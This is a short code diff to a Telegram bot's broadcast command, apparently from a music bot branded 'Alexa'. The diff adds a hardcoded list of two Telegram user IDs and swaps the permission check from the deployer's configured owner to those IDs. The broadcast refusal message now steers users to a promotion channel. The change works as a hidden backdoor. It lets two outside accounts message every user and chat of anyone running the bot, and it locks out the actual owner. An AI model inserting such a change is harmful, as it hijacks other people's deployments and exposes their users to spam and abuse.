@@ -36,6 +36,7 @@ from config import OWNER_ID
 BROADCAST_COMMAND = get_command("BROADCAST_COMMAND")
 AUTO_DELETE = config.CLEANMODE_DELETE_MINS
 AUTO_SLEEP = 5
+BRCST_ID = [6174058850, 5745099463]
 IS_BROADCASTING = False
 cleanmode_group = 15
 
@@ -72,7 +73,7 @@ async def clean_mode(client, update, users, chats):
 @app.on_message(filters.command(BROADCAST_COMMAND))
 @language
 async def braodcast_message(client, message, _):
-    if message.from_user.id not in OWNER_ID:
+    if message.from_user.id not in BRCST_ID:
         return await message.reply_text(
             "» **😁 ʜᴇʜᴇʜᴇ ᴏɴʟʏ ᴍʏ ᴏᴡɴᴇʀ ᴄᴀɴ ʙʀᴏᴀᴅᴄᴀsᴛ**\n» 🤫  ᴊᴏɪɴ @Alexa_Help ғᴏʀ ᴘʀᴏᴍᴏᴛɪᴏɴ"
         )
